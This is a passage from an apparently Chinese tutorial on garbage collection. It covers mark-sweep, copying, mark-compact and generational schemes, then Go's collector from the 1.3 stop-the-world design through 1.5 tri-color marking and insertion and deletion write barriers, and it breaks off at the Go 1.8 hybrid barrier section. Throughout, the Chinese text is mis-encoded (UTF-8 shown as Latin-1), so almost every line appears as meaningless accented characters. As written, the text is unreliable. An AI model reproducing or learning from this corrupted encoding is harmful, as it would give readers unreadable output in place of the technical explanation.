çš„å¯¹è±¡å¼€å§‹ï¼Œä¸æ–­è¿½è¸ªå¯ä»¥è¢«å¼•ç”¨åˆ°çš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡è¢«ç§°ä¸ºå¯åˆ°è¾¾çš„ï¼ˆreachableï¼‰ï¼Œå…¶ä»–å‰©ä½™çš„å¯¹è±¡å°±è¢«ç§°ä¸º garbageï¼Œå¹¶ä¸”ä¼šè¢«é‡Šæ”¾ã€‚\n\n##### 1. æ ‡è®°æ¸…é™¤\n\næ ‡è®°å‡ºæ‰€æœ‰ä¸éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œåœ¨æ ‡è®°å®Œæˆåç»Ÿä¸€å›æ”¶æ‰æ‰€æœ‰æœªè¢«æ ‡è®°çš„å¯¹è±¡ã€‚\n\n- ä¼˜ç‚¹ï¼šç®€å•ç›´æ¥ï¼Œé€Ÿåº¦å¿«ï¼Œé€‚åˆå¯å›æ”¶å¯¹è±¡ä¸å¤šçš„åœºæ™¯ã€‚\n- ç¼ºç‚¹ï¼šæ¯æ¬¡å¯åŠ¨åƒåœ¾å›æ”¶éƒ½ä¼šæš‚åœå½“å‰æ‰€æœ‰çš„æ­£å¸¸ä»£ç æ‰§è¡Œï¼Œå›æ”¶æ˜¯ç³»ç»Ÿå“åº”èƒ½åŠ›å¤§å¤§é™ä½ã€‚æ ‡è®°éœ€è¦æ‰«ææ•´ä¸ªheapï¼Œæ¸…é™¤æ•°æ®ä¼šäº§ç”Ÿheapç¢ç‰‡ã€‚\n\n##### 2. å¤åˆ¶æ”¶é›†\n\nå¤åˆ¶æ³•å°†å†…å­˜åˆ†ä¸ºå¤§å°ç›¸åŒçš„ä¸¤å—ï¼Œæ¯æ¬¡ä½¿ç”¨å…¶ä¸­çš„ä¸€å—ï¼Œå½“è¿™ä¸€å—çš„å†…å­˜ä½¿ç”¨å®Œåï¼Œå°†è¿˜å­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—å»ï¼Œç„¶åå†æŠŠä½¿ç”¨çš„ç©ºé—´ä¸€æ¬¡æ¸…ç†æ‰ã€‚\n\n- ä¼˜ç‚¹ï¼šè§£å†³äº†å†…å­˜ç¢ç‰‡çš„é—®é¢˜ï¼Œæ¯æ¬¡æ¸…é™¤é’ˆå¯¹çš„éƒ½æ˜¯æ•´å—å†…å­˜ï¼Œä½†æ˜¯å› ä¸ºç§»åŠ¨å¯¹è±¡éœ€è¦è€—è´¹æ—¶é—´ï¼Œæ•ˆç‡ä½äºæ ‡è®°æ¸…é™¤æ³•ï¼›\n- ç¼ºç‚¹ï¼šæœ‰éƒ¨åˆ†å†…å­˜æ€»æ˜¯åˆ©ç”¨ä¸åˆ°ï¼Œèµ„æºæµªè´¹ï¼Œç§»åŠ¨å­˜æ´»å¯¹è±¡æ¯”è¾ƒè€—æ—¶ï¼Œå¹¶ä¸”å¦‚æœå­˜æ´»å¯¹è±¡è¾ƒå¤šçš„æ—¶å€™ï¼Œéœ€è¦æ‹…ä¿æœºåˆ¶ç¡®ä¿å¤åˆ¶åŒºæœ‰è¶³å¤Ÿçš„ç©ºé—´å¯å®Œæˆå¤åˆ¶ï¼›\n\n##### 3. æ ‡è®°æ•´ç†\n\næ ‡è®°è¿‡ç¨‹åŒæ ‡è®°æ¸…é™¤æ³•ï¼Œç»“æŸåå°†å­˜æ´»å¯¹è±¡å‹ç¼©è‡³ä¸€ç«¯ï¼Œç„¶åæ¸…é™¤è¾¹ç•Œå¤–çš„å†…å®¹ã€‚\n\n- ä¼˜ç‚¹ï¼šè§£å†³äº†å†…å­˜ç¢ç‰‡çš„é—®é¢˜ã€‚\n- ç¼ºç‚¹ï¼šæ€§èƒ½ä½ï¼Œå› ä¸ºåœ¨ç§»åŠ¨å¯¹è±¡çš„æ—¶å€™ä¸ä»…éœ€è¦ç§»åŠ¨å¯¹è±¡è¿˜è¦ç»´æŠ¤å¯¹è±¡çš„å¼•ç”¨åœ°å€ï¼Œå¯èƒ½éœ€è¦å¯¹å†…å­˜ç»è¿‡å‡ æ¬¡æ‰«ææ‰èƒ½å®Œæˆï¼›\n\n##### 4.  åˆ†ä»£å¼\n\nå°†å¯¹è±¡æ ¹æ®å­˜æ´»æ—¶é—´çš„é•¿çŸ­è¿›è¡Œåˆ†ç±»ï¼Œå­˜æ´»æ—¶é—´å°äºæŸä¸ªå€¼çš„ä¸ºå¹´è½»ä»£ï¼Œå­˜æ´»æ—¶é—´å¤§äºæŸä¸ªå€¼çš„ä¸ºè€å¹´ä»£ï¼Œæ°¸è¿œä¸ä¼šå‚ä¸å›æ”¶çš„å¯¹è±¡ä¸ºæ°¸ä¹…ä»£ã€‚\n\nåˆ†é…å¯¹è±¡çš„æ—¶å€™ä»æ–°ç”Ÿä»£é‡Œé¢åˆ†é…ï¼Œå¦‚æœåé¢å‘ç°å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸè¾ƒé•¿ï¼Œåˆ™å°†å…¶ç§»åˆ°è€å¹´ä»£ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åš promoteã€‚éšç€ä¸æ–­ promoteï¼Œæœ€åæ–°ç”Ÿä»£çš„å¤§å°åœ¨æ•´ä¸ªå †çš„å ç”¨æ¯”ä¾‹ä¸ä¼šç‰¹åˆ«å¤§ã€‚æ”¶é›†çš„æ—¶å€™é›†ä¸­ä¸»è¦ç²¾åŠ›åœ¨æ–°ç”Ÿä»£å°±ä¼šç›¸å¯¹æ¥è¯´æ•ˆç‡æ›´é«˜ï¼ŒSTW æ—¶é—´ä¹Ÿä¼šæ›´çŸ­ã€‚  \n\n# 2. Golangçš„GC\n\n### 2.1 ç‰ˆæœ¬æ¼”å˜\n\nGoV1.3- æ™®é€šæ ‡è®°æ¸…é™¤æ³•ï¼Œæ•´ä½“è¿‡ç¨‹éœ€è¦å¯åŠ¨STWï¼Œæ•ˆç‡æä½ã€‚\n\nGoV1.5- ä¸‰è‰²æ ‡è®°æ³•ï¼Œ å †ç©ºé—´å¯åŠ¨å†™å±éšœï¼Œæ ˆç©ºé—´ä¸å¯åŠ¨ï¼Œå…¨éƒ¨æ‰«æä¹‹åï¼Œéœ€è¦é‡æ–°æ‰«æä¸€æ¬¡æ ˆ(éœ€è¦STW)ï¼Œæ•ˆç‡æ™®é€šã€‚\n\nGoV1.8- ä¸‰è‰²æ ‡è®°æ³•ï¼Œæ··åˆå†™å±éšœæœºåˆ¶ï¼Œ æ ˆç©ºé—´ä¸å¯åŠ¨ï¼Œå †ç©ºé—´å¯åŠ¨ã€‚æ•´ä¸ªè¿‡ç¨‹å‡ ä¹ä¸éœ€è¦STWï¼Œæ•ˆç‡è¾ƒé«˜ã€‚\n\n### 2.2 Go V1.3 çš„æ ‡è®°æ¸…é™¤\n\n##### 1. å…·ä½“æ­¥éª¤\n\nç¬¬ä¸€æ­¥ï¼Œæš‚åœç¨‹åºä¸šåŠ¡é€»è¾‘ï¼Œåˆ†ç±»å‡ºå¯è¾¾å’Œä¸å¯è¾¾çš„å¯¹è±¡ï¼Œç„¶ååšä¸Šæ ‡è®°ã€‚ç›®å‰ç¨‹åºçš„å¯è¾¾å¯¹è±¡æœ‰å¯¹è±¡ 1-2-3ï¼Œå¯¹è±¡ 4-7 ç­‰äº”ä¸ªå¯¹è±¡ã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/9OEzONr3qs.png\" alt=\"img\" style=\"zoom: 33%;\" />\n\nç¬¬äºŒæ­¥ , å¼€å§‹æ ‡è®°ï¼Œç¨‹åºæ‰¾å‡ºå®ƒæ‰€æœ‰å¯è¾¾çš„å¯¹è±¡ï¼Œå¹¶åšä¸Šæ ‡è®°ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/A9HoTXTRNX.png\" alt=\"img\" style=\"zoom:33%;\" />\n\nç¬¬ä¸‰æ­¥ , æ ‡è®°å®Œäº†ä¹‹åï¼Œç„¶åå¼€å§‹æ¸…é™¤æœªæ ‡è®°çš„å¯¹è±¡ã€‚ç»“æœå¦‚ä¸‹ã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/h6FhdaB3tV.png\" alt=\"img\" style=\"zoom:33%;\" />\n\næ“ä½œéå¸¸ç®€å•ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹éœ€è¦é¢å¤–æ³¨æ„ï¼šmark and sweep ç®—æ³•åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œéœ€è¦ç¨‹åºæš‚åœï¼å³ STW(stop the world)ï¼ŒSTW çš„è¿‡ç¨‹ä¸­ï¼ŒCPU ä¸æ‰§è¡Œç”¨æˆ·ä»£ç ï¼Œå…¨éƒ¨ç”¨äºåƒåœ¾å›æ”¶ï¼Œè¿™ä¸ªè¿‡ç¨‹çš„å½±å“å¾ˆå¤§ï¼Œæ‰€ä»¥ STW ä¹Ÿæ˜¯ä¸€äº›å›æ”¶æœºåˆ¶æœ€å¤§çš„éš¾é¢˜å’Œå¸Œæœ›ä¼˜åŒ–çš„ç‚¹ã€‚æ‰€ä»¥åœ¨æ‰§è¡Œç¬¬ä¸‰æ­¥çš„è¿™æ®µæ—¶é—´ï¼Œç¨‹åºä¼šæš‚å®šåœæ­¢ä»»ä½•å·¥ä½œï¼Œå¡åœ¨é‚£ç­‰å¾…å›æ”¶æ‰§è¡Œå®Œæ¯•ã€‚\n\nç¬¬å››æ­¥ , åœæ­¢æš‚åœï¼Œè®©ç¨‹åºç»§ç»­è·‘ã€‚ç„¶åå¾ªç¯é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ° process ç¨‹åºç”Ÿå‘½å‘¨æœŸç»“æŸã€‚\n\n##### 2. ç¼ºç‚¹\n\n- STWï¼Œstop the worldï¼›è®©ç¨‹åºæš‚åœï¼Œç¨‹åºå‡ºç°å¡é¡¿ **(é‡è¦é—®é¢˜)**ï¼›\n- æ ‡è®°éœ€è¦æ‰«ææ•´ä¸ª heapï¼›\n- æ¸…é™¤æ•°æ®ä¼šäº§ç”Ÿ heap ç¢ç‰‡ã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/JyUqgIH2iM.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nGo V1.3 åšäº†ç®€å•çš„ä¼˜åŒ–ï¼Œå°† STW çš„æ­¥éª¤æå‰ï¼Œå‡å°‘ STW æš‚åœçš„æ—¶é—´èŒƒå›´ã€‚å¦‚ä¸‹æ‰€ç¤º\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/du0WVdrwQw.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nä¸Šå›¾ä¸»è¦æ˜¯å°† STW çš„æ­¥éª¤æå‰äº†å¼‚æ­¥ï¼Œå› ä¸ºåœ¨ Sweep æ¸…é™¤çš„æ—¶å€™ï¼Œå¯ä»¥ä¸éœ€è¦ STW åœæ­¢ï¼Œå› ä¸ºè¿™äº›å¯¹è±¡å·²ç»æ˜¯ä¸å¯è¾¾å¯¹è±¡äº†ï¼Œä¸ä¼šå‡ºç°å›æ”¶å†™å†²çªç­‰é—®é¢˜ã€‚\n\nä½†æ˜¯æ— è®ºæ€ä¹ˆä¼˜åŒ–ï¼ŒGo V1.3 éƒ½é¢ä¸´è¿™ä¸ªä¸€ä¸ªé‡è¦é—®é¢˜ï¼Œå°±æ˜¯ mark-and-sweep ç®—æ³•ä¼šæš‚åœæ•´ä¸ªç¨‹åº ã€‚\n\n### 2.3 Go V1.5 çš„ä¸‰è‰²æ ‡è®°\n\nGolang ä¸­çš„åƒåœ¾å›æ”¶ä¸»è¦åº”ç”¨ä¸‰è‰²æ ‡è®°æ³•ï¼ŒGC è¿‡ç¨‹å’Œå…¶ä»–ç”¨æˆ· goroutine å¯å¹¶å‘è¿è¡Œï¼Œä½†éœ€è¦ä¸€å®šæ—¶é—´çš„ **STW(stop the world)**ã€‚\n\n##### 1. å…·ä½“æ­¥éª¤\n\n---\n\n**ç¬¬ä¸€æ­¥** , æ¯æ¬¡æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œé»˜è®¤çš„é¢œè‰²éƒ½æ˜¯æ ‡è®°ä¸º â€œç™½è‰²â€ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/IjRye1iH1U.png\" alt=\"img\" style=\"zoom: 33%;\" />\n\næˆ‘ä»¬çš„ç¨‹åºå¯æŠµè¾¾çš„å†…å­˜å¯¹è±¡å…³ç³»å¦‚å·¦å›¾æ‰€ç¤ºï¼Œå³è¾¹çš„æ ‡è®°è¡¨ï¼Œæ˜¯ç”¨æ¥è®°å½•ç›®å‰æ¯ä¸ªå¯¹è±¡çš„æ ‡è®°é¢œè‰²åˆ†ç±»ã€‚è¿™é‡Œé¢éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰€è°“ â€œç¨‹åºâ€ï¼Œåˆ™æ˜¯ä¸€äº›å¯¹è±¡çš„è·ŸèŠ‚ç‚¹é›†åˆã€‚æ‰€ä»¥æˆ‘ä»¬å¦‚æœå°† â€œç¨‹åºâ€ å±•å¼€ï¼Œä¼šå¾—åˆ°ç±»ä¼¼å¦‚ä¸‹çš„è¡¨ç°å½¢å¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/wpPtS71PWu.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n---\n\n**ç¬¬äºŒæ­¥** , æ¯æ¬¡ GC å›æ”¶å¼€å§‹ï¼Œä¼šä»æ ¹èŠ‚ç‚¹å¼€å§‹éå†æ‰€æœ‰å¯¹è±¡ï¼ŒæŠŠéå†åˆ°çš„å¯¹è±¡ä»ç™½è‰²é›†åˆæ”¾å…¥ â€œç°è‰²â€ é›†åˆå¦‚å›¾æ‰€ç¤ºã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/QWZrAuef2t.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\nè¿™é‡Œ è¦æ³¨æ„çš„æ˜¯ï¼Œæœ¬æ¬¡éå†æ˜¯ä¸€æ¬¡éå†ï¼Œéé€’å½’å½¢å¼ï¼Œæ˜¯ä»ç¨‹åºæŠ½æ¬¡å¯æŠµè¾¾çš„å¯¹è±¡éå†ä¸€å±‚ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå½“å‰å¯æŠµè¾¾çš„å¯¹è±¡æ˜¯å¯¹è±¡ 1 å’Œå¯¹è±¡ 4ï¼Œé‚£ä¹ˆè‡ªç„¶æœ¬è½®éå†ç»“æŸï¼Œå¯¹è±¡ 1 å’Œå¯¹è±¡ 4 å°±ä¼šè¢«æ ‡è®°ä¸ºç°è‰²ï¼Œç°è‰²æ ‡è®°è¡¨å°±ä¼šå¤šå‡ºè¿™ä¸¤ä¸ªå¯¹è±¡ã€‚\n\n---\n\n**ç¬¬ä¸‰æ­¥** , éå†ç°è‰²é›†åˆï¼Œå°†ç°è‰²å¯¹è±¡å¼•ç”¨çš„å¯¹è±¡ä»ç™½è‰²é›†åˆæ”¾å…¥ç°è‰²é›†åˆï¼Œä¹‹åå°†æ­¤ç°è‰²å¯¹è±¡æ”¾å…¥é»‘è‰²é›†åˆï¼Œå¦‚å›¾æ‰€ç¤ºã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/6KYOsOOUr5.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\nè¿™ä¸€æ¬¡éå†æ˜¯åªæ‰«æç°è‰²å¯¹è±¡ï¼Œå°†ç°è‰²å¯¹è±¡çš„ç¬¬ä¸€å±‚éå†å¯æŠµè¾¾çš„å¯¹è±¡ç”±ç™½è‰²å˜ä¸ºç°è‰²ï¼Œå¦‚ï¼šå¯¹è±¡ 2ã€å¯¹è±¡ 7. è€Œä¹‹å‰çš„ç°è‰²å¯¹è±¡ 1 å’Œå¯¹è±¡ 4 åˆ™ä¼šè¢«æ ‡è®°ä¸ºé»‘è‰²ï¼ŒåŒæ—¶ç”±ç°è‰²æ ‡è®°è¡¨ç§»åŠ¨åˆ°é»‘è‰²æ ‡è®°è¡¨ä¸­ã€‚\n\n---\n\n**ç¬¬å››æ­¥** , é‡å¤ç¬¬ä¸‰æ­¥ , ç›´åˆ°ç°è‰²ä¸­æ— ä»»ä½•å¯¹è±¡ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/PouBtxPAp0.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/ikQyJgeamK.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\nå½“æˆ‘ä»¬å…¨éƒ¨çš„å¯è¾¾å¯¹è±¡éƒ½éå†å®Œåï¼Œç°è‰²æ ‡è®°è¡¨å°†ä¸å†å­˜åœ¨ç°è‰²å¯¹è±¡ï¼Œç›®å‰å…¨éƒ¨å†…å­˜çš„æ•°æ®åªæœ‰ä¸¤ç§é¢œè‰²ï¼Œé»‘è‰²å’Œç™½è‰²ã€‚é‚£ä¹ˆé»‘è‰²å¯¹è±¡å°±æ˜¯æˆ‘ä»¬ç¨‹åºé€»è¾‘å¯è¾¾ï¼ˆéœ€è¦çš„ï¼‰å¯¹è±¡ï¼Œè¿™äº›æ•°æ®æ˜¯ç›®å‰æ”¯æ’‘ç¨‹åºæ­£å¸¸ä¸šåŠ¡è¿è¡Œçš„ï¼Œæ˜¯åˆæ³•çš„æœ‰ç”¨æ•°æ®ï¼Œä¸å¯åˆ é™¤ï¼Œç™½è‰²çš„å¯¹è±¡æ˜¯å…¨éƒ¨ä¸å¯è¾¾å¯¹è±¡ï¼Œç›®å‰ç¨‹åºé€»è¾‘å¹¶ä¸ä¾èµ–ä»–ä»¬ï¼Œé‚£ä¹ˆç™½è‰²å¯¹è±¡å°±æ˜¯å†…å­˜ä¸­ç›®å‰çš„åƒåœ¾æ•°æ®ï¼Œéœ€è¦è¢«æ¸…é™¤ã€‚\n\n---\n\n**ç¬¬äº”æ­¥**: å›æ”¶æ‰€æœ‰çš„ç™½è‰²æ ‡è®°è¡¨çš„å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯å›æ”¶åƒåœ¾ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚\n\nä»¥ä¸Šæˆ‘ä»¬å°†å…¨éƒ¨çš„ç™½è‰²å¯¹è±¡è¿›è¡Œåˆ é™¤å›æ”¶ã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/7nW3dpe38I.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\nå‰©ä¸‹çš„å°±æ˜¯å…¨éƒ¨ä¾èµ–çš„é»‘è‰²å¯¹è±¡ã€‚\n\nä»¥ä¸Šä¾¿æ˜¯ä¸‰è‰²å¹¶å‘æ ‡è®°æ³•ï¼Œä¸éš¾çœ‹å‡ºï¼Œæˆ‘ä»¬ä¸Šé¢å·²ç»æ¸…æ¥šçš„ä½“ç°ä¸‰è‰²çš„ç‰¹æ€§ã€‚ä½†æ˜¯è¿™é‡Œé¢å¯èƒ½ä¼šæœ‰å¾ˆå¤šå¹¶å‘æµç¨‹å‡ä¼šè¢«æ‰«æï¼Œæ‰§è¡Œå¹¶å‘æµç¨‹çš„å†…å­˜å¯èƒ½ç›¸äº’ä¾èµ–ï¼Œä¸ºäº†åœ¨ GC è¿‡ç¨‹ä¸­ä¿è¯æ•°æ®çš„å®‰å…¨ï¼Œæˆ‘ä»¬åœ¨å¼€å§‹ä¸‰è‰²æ ‡è®°ä¹‹å‰å°±ä¼šåŠ ä¸Š STWï¼Œåœ¨æ‰«æç¡®å®šé»‘ç™½å¯¹è±¡ä¹‹åå†æ”¾å¼€ STWã€‚ä½†æ˜¯å¾ˆæ˜æ˜¾è¿™æ ·çš„ GC æ‰«æçš„æ€§èƒ½å®åœ¨æ˜¯å¤ªä½äº†ã€‚\n\nå¦‚æœä¸è¿›è¡Œ STWï¼Œå¦‚ä¸‹å¹¶å‘æƒ…å†µä¸‹ï¼Œä¼šè¯¯åˆ ç™½è‰²å¯¹è±¡ã€‚\n\n- æ¡ä»¶ 1: ä¸€ä¸ªç™½è‰²å¯¹è±¡è¢«é»‘è‰²å¯¹è±¡å¼•ç”¨ **(ç™½è‰²è¢«æŒ‚åœ¨é»‘è‰²ä¸‹)**\n- æ¡ä»¶ 2: ç°è‰²å¯¹è±¡ä¸å®ƒä¹‹é—´çš„å¯è¾¾å…³ç³»çš„ç™½è‰²å¯¹è±¡é­åˆ°ç ´å **(ç°è‰²åŒæ—¶ä¸¢äº†è¯¥ç™½è‰²)**\n\n### 2.4  å±éšœæœºåˆ¶ä»‹ç»\n\næˆ‘ä»¬è®© GC å›æ”¶å™¨ï¼Œæ»¡è¶³ä¸‹é¢ä¸¤ç§æƒ…å†µä¹‹ä¸€æ—¶ï¼Œå³å¯ä¿å¯¹è±¡ä¸ä¸¢å¤±ã€‚ è¿™ä¸¤ç§æ–¹å¼å°±æ˜¯ â€œå¼ºä¸‰è‰²ä¸å˜å¼â€ å’Œ â€œå¼±ä¸‰è‰²ä¸å˜å¼â€ã€‚\n\n##### 1. å¼ºä¸‰è‰²ä¸å˜å¼\n\nå¼ºä¸‰è‰²ä¸å˜è‰²å®é™…ä¸Šæ˜¯å¼ºåˆ¶æ€§çš„ä¸å…è®¸é»‘è‰²å¯¹è±¡å¼•ç”¨ç™½è‰²å¯¹è±¡ï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºç°æœ‰ç™½è‰²å¯¹è±¡è¢«è¯¯åˆ çš„æƒ…å†µã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/wvSogXGNIF.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n##### 2. å¼±ä¸‰è‰²ä¸å˜å¼\n\nå¼±ä¸‰è‰²ä¸å˜å¼å¼ºè°ƒï¼Œé»‘è‰²å¯¹è±¡å¯ä»¥å¼•ç”¨ç™½è‰²å¯¹è±¡ï¼Œä½†æ˜¯è¿™ä¸ªç™½è‰²å¯¹è±¡å¿…é¡»å­˜åœ¨å…¶ä»–ç°è‰²å¯¹è±¡å¯¹å®ƒçš„å¼•ç”¨ï¼Œæˆ–è€…å¯è¾¾å®ƒçš„é“¾è·¯ä¸Šæ¸¸å­˜åœ¨ç°è‰²å¯¹è±¡ã€‚ è¿™æ ·å®åˆ™æ˜¯é»‘è‰²å¯¹è±¡å¼•ç”¨ç™½è‰²å¯¹è±¡ï¼Œç™½è‰²å¯¹è±¡å¤„äºä¸€ä¸ªå±é™©è¢«åˆ é™¤çš„çŠ¶æ€ï¼Œä½†æ˜¯ä¸Šæ¸¸ç°è‰²å¯¹è±¡çš„å¼•ç”¨ï¼Œå¯ä»¥ä¿æŠ¤è¯¥ç™½è‰²å¯¹è±¡ï¼Œä½¿å…¶å®‰å…¨ã€‚\n\nä¸ºäº†éµå¾ªä¸Šè¿°çš„ä¸¤ä¸ªæ–¹å¼ï¼ŒGC ç®—æ³•æ¼”è¿›åˆ°ä¸¤ç§å±éšœæ–¹å¼ï¼Œä»–ä»¬ â€œæ’å…¥å±éšœâ€, â€œåˆ é™¤å±éšœâ€ã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/QGq9avk8AH.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n##### 3. æ’å…¥å†™å±éšœ\n\n+  åœ¨ A å¯¹è±¡å¼•ç”¨ B å¯¹è±¡çš„æ—¶å€™ï¼ŒB å¯¹è±¡è¢«æ ‡è®°ä¸ºç°è‰²ã€‚(å°† B æŒ‚åœ¨ A ä¸‹æ¸¸ï¼ŒB å¿…é¡»è¢«æ ‡è®°ä¸ºç°è‰²)\n+ æ»¡è¶³å¼ºä¸‰è‰²ä¸å˜å¼. (ä¸å­˜åœ¨é»‘è‰²å¯¹è±¡å¼•ç”¨ç™½è‰²å¯¹è±¡çš„æƒ…å†µäº†ï¼Œ å› ä¸ºç™½è‰²ä¼šå¼ºåˆ¶å˜æˆç°è‰²)\n\næ ˆç©ºé—´çš„ç‰¹ç‚¹æ˜¯å®¹é‡å°ï¼Œä½†æ˜¯è¦æ±‚ç›¸åº”é€Ÿåº¦å¿«ï¼Œå› ä¸ºå‡½æ•°è°ƒç”¨å¼¹å‡ºé¢‘ç¹ä½¿ç”¨ï¼Œ**æ‰€ä»¥ â€œæ’å…¥å±éšœâ€ æœºåˆ¶ï¼Œåœ¨æ ˆç©ºé—´çš„å¯¹è±¡æ“ä½œä¸­ä¸ä½¿ç”¨ï¼Œ è€Œä»…ä»…ä½¿ç”¨åœ¨å †ç©ºé—´å¯¹è±¡çš„æ“ä½œä¸­ã€‚**\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/5BmQjsbkUd.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/v0BdIRgWkX.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/CHoU7xt2Rh.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/QU8enG8Y7i.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/yz984t2qgC.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/ksISy2L0hA.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\nä½†æ˜¯å¦‚æœæ ˆä¸æ·»åŠ ï¼Œå½“å…¨éƒ¨ä¸‰è‰²æ ‡è®°æ‰«æä¹‹åï¼Œæ ˆä¸Šæœ‰å¯èƒ½ä¾ç„¶å­˜åœ¨ç™½è‰²å¯¹è±¡è¢«å¼•ç”¨çš„æƒ…å†µ (å¦‚ä¸Šå›¾çš„å¯¹è±¡ 9). æ‰€ä»¥è¦å¯¹æ ˆé‡æ–°è¿›è¡Œä¸‰è‰²æ ‡è®°æ‰«æï¼Œä½†è¿™æ¬¡ä¸ºäº†å¯¹è±¡ä¸ä¸¢å¤±ï¼Œè¦å¯¹æœ¬æ¬¡æ ‡è®°æ‰«æå¯åŠ¨ STW æš‚åœã€‚ç›´åˆ°æ ˆç©ºé—´çš„ä¸‰è‰²æ ‡è®°ç»“æŸã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/PZoaRVvQXM.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/4qvHtIg4tx.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/EaR0qIfUtL.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\næœ€åå°†æ ˆå’Œå †ç©ºé—´ æ‰«æå‰©ä½™çš„å…¨éƒ¨ ç™½è‰²èŠ‚ç‚¹æ¸…é™¤ã€‚è¿™æ¬¡ STW å¤§çº¦çš„æ—¶é—´åœ¨ 10~100ms é—´ã€‚\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/jx99HZvdns.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n##### 4. åˆ é™¤å†™å±éšœ\n\n+ è¢«åˆ é™¤çš„å¯¹è±¡ï¼Œå¦‚æœè‡ªèº«ä¸ºç™½è‰²æˆ–ç°è‰²ï¼Œé‚£ä¹ˆè¢«æ ‡è®°ä¸ºç°è‰²ã€‚\n+ æ»¡è¶³å¼±ä¸‰è‰²ä¸å˜å¼. (ä¿æŠ¤ç°è‰²å¯¹è±¡åˆ°ç™½è‰²å¯¹è±¡çš„è·¯å¾„ä¸ä¼šæ–­)\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/jw5V3ViFnp.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/rAQjRB9EmR.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/jek807jJzT.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/KRD44mSOwQ.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"https://cdn.learnku.com/uploads/images/202205/23/58489/Ze3RIBDzso.jpeg!large\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/dWE31AVl3s.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"golangçš„GCåƒåœ¾å›æ”¶/tCHIzooK1p.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\nè¿™ç§æ–¹å¼çš„å›æ”¶ç²¾åº¦ä½ï¼Œä¸€ä¸ªå¯¹è±¡å³ä½¿è¢«åˆ é™¤äº†æœ€åä¸€ä¸ªæŒ‡å‘å®ƒçš„æŒ‡é’ˆä¹Ÿä¾æ—§å¯ä»¥æ´»è¿‡è¿™ä¸€è½®ï¼Œåœ¨ä¸‹ä¸€è½® GC ä¸­è¢«æ¸…ç†æ‰ã€‚\n\n### 2.5 Go V1.8 çš„æ··åˆå†™å±éšœæœºåˆ¶\n\n##### 1. æ’å…¥å†™å±éšœå’Œåˆ é™¤å†™å±éšœçš„çŸ­æ¿\n\n- 